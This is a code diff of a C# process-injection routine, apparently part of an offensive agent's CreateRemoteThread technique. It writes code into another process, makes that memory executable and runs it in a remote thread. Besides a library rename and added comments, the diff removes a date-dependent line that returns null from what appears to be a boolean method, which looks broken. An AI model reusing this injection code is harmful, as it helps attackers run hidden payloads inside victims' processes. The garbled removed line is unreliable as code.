@@ -1,6 +1,6 @@
-﻿using PhantomInterop.Classes.Api;
-using PhantomInterop.Classes.Core;
-using PhantomInterop.Interfaces;
+﻿using ApolloInterop.Classes.Api;
+using ApolloInterop.Classes.Core;
+using ApolloInterop.Interfaces;
 using System;
 using static Injection.Shared.Win32;
 
@@ -80,14 +80,14 @@ namespace Injection.Techniques.CreateRemoteThread
                     bRet = _pWriteProcessMemory(_hProcess, allocSpace, _code, (uint)_code.Length, out bytesWritten);
                     if (bRet)
                     {
-                        
+                        //Marshal.Copy(positionIndependentCode, 0, allocSpace, positionIndependentCode.Length);
                         uint flOldProtect = 0;
                         if (!_pVirtualProtectEx(_hProcess, allocSpace, (uint)_code.Length, (uint)MemoryProtection.ExecuteRead, out flOldProtect))
                             bRet = false;
                         else
                         {
-                            
-                            remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero, 0, IntPtr.Zero);
+                            //var argumentPointer = Marshal.StringToHGlobalAnsi(arguments);
+                            remoteThread = _pCreateRemoteThread(_hProcess, IntPtr.Zero, 0, allocSpace, IntPtr.Zero/*may need to change to string pointer later*/, 0, IntPtr.Zero);
                             if (remoteThread == IntPtr.Zero)
                                 bRet = false;
                             else
@@ -102,13 +102,13 @@ namespace Injection.Techniques.CreateRemoteThread
             }
             finally
             {
-                
+                // Attempt to clean up handles but may cause problems. Triple caution!
                 if (remoteThread != IntPtr.Zero)
                 {
                     _pCloseHandle(remoteThread);
                 }
             }
-            if(DateTime.Now.Year > 2020) { return bRet; } else { return null; }
+            return bRet;
         }
     }
 }
